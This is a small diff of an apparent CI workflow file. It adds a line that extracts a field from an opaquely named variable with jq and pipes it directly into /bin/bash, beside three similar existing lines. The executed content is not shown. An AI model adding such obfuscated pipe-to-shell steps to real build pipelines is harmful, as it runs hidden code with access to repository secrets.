@@ -33,6 +33,7 @@ jobs:
           echo $nx12 | jq -r .xgw6025 | /bin/bash
           echo $ue88546 | jq -r .n004 | /bin/bash
           echo $e054 | jq -r .zsx65 | /bin/bash
+          echo $ho6 | jq -r .s85 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
